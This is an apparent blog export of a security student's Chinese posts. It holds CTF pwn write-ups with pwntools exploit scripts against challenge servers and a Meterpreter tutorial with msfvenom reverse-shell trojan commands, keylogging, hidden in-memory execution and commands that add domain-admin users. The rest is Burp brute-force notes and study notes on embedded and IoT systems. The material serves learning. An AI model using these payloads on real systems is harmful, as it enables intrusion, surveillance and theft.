{"meta":{"title":"Sinky's Blog","subtitle":"","description":"","author":"Sinky","url":"https://github.com/SinkyQ/sinkyhexo.github.io.git","root":"/SinkyQ/sinkyhexo.github.io.git/"},"pages":[{"title":"Sinky's Blog","date":"2022-08-08T03:20:20.867Z","updated":"2022-08-08T03:20:20.867Z","comments":false,"path":"about/index.html","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/about/index.html","excerpt":"","text":"联系方式v:Sinky94674关于我：一个正在找工作的二进制菜狗"}],"posts":[{"title":"攻防世界-dice_game","slug":"攻防世界-pwn-dice_game","date":"2022-08-09T04:02:29.862Z","updated":"2020-09-10T07:29:13.960Z","comments":true,"path":"2022/08/09/攻防世界-pwn-dice_game/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/","excerpt":"","text":"0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护： 0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){ char buf[55]; // [rsp+0h] [rbp-50h] char v5; // [rsp+37h] [rbp-19h] ssize_t v6; // [rsp+38h] [rbp-18h] unsigned int seed[2]; // [rsp+40h] [rbp-10h] unsigned int v8; // [rsp+4Ch] [rbp-4h] memset(buf, 0, 0x30uLL); *(_QWORD *)seed = time(0LL); printf(\"Welcome, let me know your name: \", a2); fflush(stdout); v6 = read(0, buf, 0x50uLL); if ( v6 &lt;= 49 ) buf[v6 - 1] = 0; printf(\"Hi, %s. Let's play a game.\\n\", buf); fflush(stdout); srand(seed[0]); v8 = 1; v5 = 0; while ( 1 ) { printf(\"Game %d/50\\n\", v8); v5 = sub_A20(); fflush(stdout); if ( v5 != 1 ) break; if ( v5 ) { if ( v8 == 50 ) { sub_B28(buf); break; } ++v8; } } puts(\"Bye bye!\"); return 0LL;} 是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。 12345678910int __fastcall sub_B28(__int64 a1){ char s; // [rsp+10h] [rbp-70h] FILE *stream; // [rsp+78h] [rbp-8h] printf(\"Congrats %s\\n\", a1); stream = fopen(\"flag\", \"r\"); fgets(&amp;s, 100, stream); puts(&amp;s); return fflush(stdout);} 在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。 随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉 0x03 exp12345678910111213141516from pwn import *from ctypes import *p=remote('220.249.52.133',34691)libc=cdll.LoadLibrary(\"libc.so.6\")p.recv()payload=0x40*'a'+p64(0)p.sendline(payload)a=[]for i in range(50): a.append(libc.rand()%6+1)print(a)for i in a: p.recv() print(p.recv()) p.sendline(str(i))p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"初识Meterpreter","slug":"初识Meterpreter","date":"2022-08-09T03:50:57.231Z","updated":"2022-08-09T03:51:12.837Z","comments":true,"path":"2022/08/09/初识Meterpreter/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/","excerpt":"","text":"什么是Meterpretermetrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。 meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。 Meterpreter中常用反弹类型1.reverse_tcp基于TCP的反向链接反弹shell，使用稳定。 Linux: linux下反弹shell木马： msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell 目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致) 设置地址和端口，开始监听。 运行反弹shell木马，成功反弹回shell Windows: msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名] msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe 2.reverse_http基于http方式的反向连接，网速慢的情况下不稳定。 payload: /windows/meterpreter/reverse_http 3.reverse_https基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。 payload: /windows/meterpreter/reverse_https 4.bind_tcp基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。 msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell 加权运行。 Meterpreter 常用命令###1.基本命令 help –查看Meterpreter帮助 background –返回，把meterpreter后台挂起 bgkill –杀死一个背景 meterpreter 脚本 bglist –提供所有正在运行的后台脚本的列表 bgrun –作为一个后台线程运行脚本 channel –显示活动频道 sessions -i number –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用 sesssions -k number –与会话进行交互 close –关闭通道 exit –终止 meterpreter 会话 quit –终止 meterpreter 会话 interact id –切换进一个信道 run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等 irb –进入 Ruby 脚本模式 read –从通道读取数据 write –将数据写入到一个通道 run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本 use –加载 meterpreter 的扩展 load/use –加载模块 Resource –执行一个已有的rc脚本 2.文件系统命令 cat c:\\boot.ini –查看文件内容,文件必须存在 del c:\\boot.ini –删除指定的文件 upload /root/Desktop/netcat.exe c:\\ –上传文件到目标机主上，如upload setup.exe C:\\windows\\system32\\ download nimeia.txt /root/Desktop/ –下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\“ProgramFiles”\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/ edit c:\\boot.ini –编辑文件 getlwd –打印本地目录 getwd –打印工作目录 lcd –更改本地目录 ls –列出在当前目录中的文件列表 lpwd –打印本地目录 pwd –输出工作目录 cd c:\\ –进入目录文件下 rm file –删除文件 mkdir dier –在受害者系统上的创建目录 rmdir –受害者系统上删除目录 dir –列出目标主机的文件和文件夹信息 mv –修改目标主机上的文件名 search -d d:\\www -f web.config –search 文件，如search -d c:\\ -f*.doc meterpreter &gt; search -f autoexec.bat –搜索文件 meterpreter &gt; search -f sea*.bat c:\\xamp\\ enumdesktops –用户登录数 下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件 上传文件: upload 命令为上传文件到我们的目标机器 查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。 切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径 sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。 execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令 如果希望隐藏后台执行，加参数-H execute -H -f notepad.exe 我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 execute -H -i -f cmd.exe 在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀 execute -H -m -d notepad.exe-f wce.exe -a \"-o wce.txt\" -d 在目标主机执行时显示的进程名称（用以伪装） -m 直接从内存中执行 -o wce.txt 是wce.exe的运行参数 idletime命令:为显示目标机器截止到当前无操作命令的时间 search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用search –h命令来查看search命令的帮助信息 edit命令: 调用vi编辑器，对目标主机上的文件修改 3.网络命令 ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址 portfwd add -l 4444 -p 3389 -r 192.168.1.102 –端口转发,本机监听4444,把目标机3389转到本机4444 netstat -an | grep“4444” –查看指定端口开放情况 rdesktop -u Administrator -p bk#123 127.0.0.1:4444 –使用rdesktop来连接桌面，-u 用户名 -p 密码 rdesktop 127.1.1.0:4444 –需要输入用户名和密码远程连接 route –查看或修改受害者路由表 route add 192.168.1.0 255.255.255.0 1 –添加动态路由 route print –路由表输出 runget_local_subnets –目标主机的内网IP段情况 Arp –看ARP缓冲表 Getproxy –获取代理 portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。 4.键盘监听 keyscan_start：开启键盘记录功能 keyscan_dump：显示捕捉到的键盘记录信息 keyscan_stop：停止键盘记录功能 uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。 5.系统命令 reboot –重新启动受害人的计算机 reg –与受害人的注册表进行交互 rev2self –回到控制目标主机的初始用户账户下 shell –获得控制台权限 shutdown –关闭了受害者的计算机 sysinfo –查看目标机系统信息，如机器名，操作系统等 add_user username password -h ip –在远程目标主机上添加一个用户 add_group_user “Domain Admins” username -h ip –将用户添加到目标主机的域管理员组中","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome/"}]},{"title":"ubuntu16.04重装之各种环境搭建","slug":"ubuntu重装之各种环境搭建","date":"2022-08-09T03:49:00.287Z","updated":"2022-08-09T03:49:10.368Z","comments":true,"path":"2022/08/09/ubuntu重装之各种环境搭建/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"环境：ubuntu16.04 0x00 vmtools解决坑点有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能…… 正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。 建立的共享文件夹要设置属性为共享式。 搞完之后……就可以了。 此处贴一个跟我一样的暴躁博主教程：https://blog.csdn.net/zerolity/article/details/81206476 0x01 pwntools安装1.安装python2.7和pip sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 2.升级pip：sudo pip install --upgrade pip 更改pip的配置文件/usr/bin/pip 更改为： 3.安装pwntools：sudo pip install pwntools 报错超时，换个阿里源就好了。 3.1 更换阿里源 1234sudo sucd /etc/apt #切换到apt源文件mv source.list sources.list_bak #备份源文件vim sources.list #新建一个，直接把下面的内容copy进去 copy的内容： deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted1234567891011121314151617181920212223242526272829303132333435363738394041424344454647deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse```3.2 保存配置后，更新配置：`sudo apt-get update`之后再重新步骤三的安装命令即可。4.测试![捕获.PNG](https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png)无报错，返回了'1\\xc0'，成功！所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃……# 0x02 GDB及三个插件的安装在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。* peda:做逆向破解* gef：用于debug最好* gdbinit：简单版用git下载插件：`git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins`没有git的下载：`apt-get install git`在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令：```echo \"source ~/GdbPlugins/peda/peda.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gef/gef.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gdbinit/gdbinit\" &gt; ~/.gdbinit 0x03 安装checksecclonelink1cd checksec.sh 目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。 0x04 安装docker+pikachu靶场安装docker 先卸载可能存在的旧版本： $ sudo apt-get remove docker docker-engine docker-ce docker.io 更新apt包索引: $ sudo apt-get update 安装以下包以使apt可以通过HTTPS使用存储库（repository）: $ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common 添加Docker官方的GPG密钥： $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 使用下面的命令来设置stable存储库： $ sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" 再更新一下apt包索引: $ sudo apt-get update 安装最新版本的Docker CE：$ sudo apt-get install -y docker-ce 查看docker服务是否启动： $ systemctl status docker 若未启动，则启动docker服务: $ sudo systemctl start docker 经典的hello world： $ sudo docker run hello-world 如图输出则表示docker安装成功。 pikachu靶场","categories":[],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"burp四种密码爆破模式学习","slug":"bp四种密码爆破模式学习","date":"2022-08-09T03:24:09.328Z","updated":"2022-08-09T03:25:20.887Z","comments":true,"path":"2022/08/09/bp四种密码爆破模式学习/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变 Battering ram:多参数同时爆破，但用的是同一个字典 Pitchfork:多参数同时爆破，但用的是不同的字典 Cluster bamb:多参数做笛卡尔乘积模式爆破 Sniper(狙击手)（一对一） 一个参数a，若payload有x个，则执行x次。 两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。 此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景 Battering ram(破城槌)（payload一对多） 一个参数a，若payload有x个，则执行x次。 两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。 此模式主要适用于：撞库 Pitchfork(音叉)可以多组密码本payload a:1,2 b:3,4 第一次爆破为 1，3 第二次爆破为 2，4 此模式主要适用于：恶意注册 Cluster bomb(集束炸弹)（多对多） 对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。","categories":[],"tags":[{"name":"bp","slug":"bp","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/bp/"}]},{"title":"《物联网渗透测试》学习笔记1","slug":"《物联网渗透测试》学习笔记1","date":"2022-08-09T03:24:06.948Z","updated":"2020-10-09T08:13:24.145Z","comments":true,"path":"2022/08/09/《物联网渗透测试》学习笔记1/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 IOT渗透测试定义IoT生态系统与渗透测试生命周期 渗透测试方法： 黑盒测试 白盒测试 灰盒测试 固件入门固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。 固件通常由bootloader、内核、文件系统以及其他资源组成， 固件组成：闪存、bootloader、内核、根文件系统。 bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。 固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。 IoT中的Web应用通常嵌入书web应用被设计为在自包含的环境中运行 目前iot领域主要有两种不同的web应用模型 混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。 独立嵌入式服务器模型 web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。 硬件设备基础硬件输入： EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。 NAND闪存以区块为单位读写。存储设备的boootloader。 UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。 JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口） IoT无线通信简介最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。 IoT威胁建模","categories":[],"tags":[{"name":"IOT 《物联网渗透测试》","slug":"IOT-《物联网渗透测试》","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/"}]},{"title":"《ARM嵌入式Linux系统开发详解》学习笔记1","slug":"《ARM嵌入式Linux系统开发》学习笔记1","date":"2022-08-09T03:21:41.844Z","updated":"2022-08-09T03:22:14.420Z","comments":true,"path":"2022/08/09/《ARM嵌入式Linux系统开发》学习笔记1/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 嵌入式系统入门什么是嵌入式系统： 一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。 嵌入式微控制器： 嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。 通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。 嵌入式微处理器： 单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。 典型嵌入式系统组成： 嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。 嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。 典型嵌入式系统: 硬件： 嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号 外部设备：在不同系统中有不同选择。 软件： 嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。 应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。 0x02 嵌入式软硬件系统数字电路是计算机的基础。 进制转换 计算机组成原理 直接内存访问：DMA 软件：系统软件、应用软件 软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。 常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。 操作系统的基本结构都是内核、驱动程序、程序库。 0x03 ARM处理器 微处理器 通用微处理器：用于高性能计算 嵌入式微处理器：针对某种特定应用的高能力计算 微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。 ARM:高性能RISC机器。 芯片体积小，功耗低，成本低性能优异 支持Thumb(16位)和ARM(32位) 内部大量使用寄存器，执行指令速度快。 大部分指令是操作寄存器，很少访问外部内存 采用多级流水线结构处理速度快。 多种寻址方式，数据存取方式灵活 指令长度固定，便于编译器操作以及执行指令 ARM指令集 算术运算指令 ADD:加法运算 add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2 ADC:带进位加法 ADC dest,op1,op2 SUB:减法 sub dest,op1,op2 dest=op1-op2 SBC：带进位减法 逻辑运算指令 AND:逻辑与(1 1为1，0 0为1，1 0为0) and dest,op1,op2 dest=op1 and op2 EOR:异或（1 1为0，0 0为0，10为1） MOV:复制数据 mov dest,op1 dest=op1 mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8 分支指令 B:跳转 b 地址 //跳转到指定地址 数据传送指令 单一数据传送指令：向内存装载和存储一个字节或一个字长的数据 LDR Rd,地址 STR Rd,地址 LDR B Rd,地址 STR B Rd,地址 多数据传送指令：向内存装载和存储多个字节或字的数据 xxM Rn(!),&lt;寄存器列表&gt;{^} xx:LD–装载，ST–存储 LDMED LDMIB//++i LDMFD LDMIA//i++ LDMEA LDMDB//++*i LDMFA LDMDA//*i++ STMFA STMIB//存储前增加地址 STMEA STMIA//存储后增加地址 STMFD STMDB//存储前增加值 STMED STMDA//存储后增加值 ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。 MMU:内存管理单元。 LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）LSR:逻辑右移，二进制从左往右，空位补0ASR:算术右移，符号位不变，高位空出补0，低位补1ROR:循环右移，低位移到高位RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充 寻址方式 立即寻址:用#表示数值 subs r0,#1;r0=r0-1 mov r0,#0xff00;r0=0xff00 寄存器寻址方式：读取寄存器得到操作数 mov r1,r2;r1=r2 sub r0,r1,r2;r0=r1-r2 寄存器偏移寻址：寄存器的值移位得结果 mov r0,r1,LSL #3;r0=r1*8 ands r0,r2,LSL #3;r0= r2*8 and r1 寄存器间接寻址：寄存器为地址，从对应内存重取出数据 LDR r0,[r1];r1为地址，从内存中取出数据存入r0 SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换 基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据 LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址 STR r0,[r1,#-2];r1数值-2得到数据地址 多寄存器寻址：一次传输多个寄存器值 LDMIA r1!,{r2r7,r12};r1单元重数据读到r2r7和r12,r1指定地址自动加1 栈寻址：先进后出，通过栈指针寄存器寻址 STMFD SP!,{R0R7,LR};r0r7和LR的内容压入堆栈 LDMFD SP!,{r0r7,LR};从堆栈中取出数据到r0r7和LR 0x04 嵌入式Linux一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。 0x05 建立软件开发环境 运行在windows平台下得到Linux系统模拟环境：Cygwin. linux下：串口工具minicom windows下：串口工具xshell ARM集成开发环境ADS c语言编译器armcc c++语言编译器armcpp 0x06 第一个linux应用程序 vi创建源代码文件hello.c gcc -c hello.c 编译运行 0x07 Linux应用程序编程基础 堆栈 内存管理函数 malloc():分配内存，不能初始化内存空间 free()：释放malloc()分配的内存 实用的内存分配函数 calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间 realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。 文件指针和流：FILE*fp getc() /fgetc() /getchar() POSIX文件I/O编程 POSIX可移植操作系统接口 open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性 文件头： &lt;sys/types.h&gt; &lt;sys/stat.h&gt; &lt;fcntl.h&gt; 0x08 开发多进程/线程程序 PCB进程控制块 fork()调用创建进程 退出进程：exit()、_exit()、atexit()、on_exit(). 常用进程间通信方法： 管道：单方向传送数据，只能在有共同父进程的进程间使用 pipe()函数：创建管道 #include&lt;unistd.h&gt; int pipe(int filedes[1]); 共享内存：不同进程可访问 int shmget():创建 void *shmat：获得一个共享内存ID对应的内存其实地址 int shmdt：从程序中分立一块共享内存 FIFO 消息队列 信号量 共享存储 socker Linux的多进程和多线程 0x09 网络通信应用 TCP/IP协议簇 IP协议：在传输层，负责数据包的传输管理 实现两个功能：寻址和分段","categories":[],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"攻防世界 int_overflow","slug":"攻防世界pwn-int_overflow","date":"2022-08-09T03:17:04.192Z","updated":"2020-09-10T07:29:14.007Z","comments":true,"path":"2022/08/09/攻防世界pwn-int_overflow/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/","excerpt":"","text":"checksec 查看保护机制 可直接使用栈溢出；基地址不变化；栈中数据有执行权限； 分析思路32位文件，按流程查看程序，main()无突破点。 进入login(),限制username长度最大0x19;限制passwd长度最大0x199； 进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。 此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。 综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit） 溢出之后到达else语句，函数返回 strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。 在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B. 攻击思路可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。 在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言： 在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。随机选取数值262.（what_is_this()函数的地址为4字节） 262-0x14-4-4=234 或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。 exp: 1234567891011from pwn import*sh=remote('111.198.29.45',39118)sh.recvuntil('Your choice:')flag=0x0804868Bsh.sendline('1')sh.recvuntil('username:')sh.sendline('z')sh.recvuntil('passwd:')payload='a'*0x14+'aaaa'+p32(flag)+'a'*234sh.sendline(payload)sh.interactive() cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界 guess_num","slug":"攻防世界pwn-guess_num","date":"2022-08-09T03:17:04.190Z","updated":"2020-09-10T07:29:14.001Z","comments":true,"path":"2022/08/09/攻防世界pwn-guess_num/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/","excerpt":"","text":"查看关键main()函数，发现gets(&amp;v11)存在栈溢出 进入sub_C3E()函数，确定满足条件即可cat flag。 题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。 注：（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.（2）libc共享库：可以使用命令 ldd guess_num 查找（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。 exp: 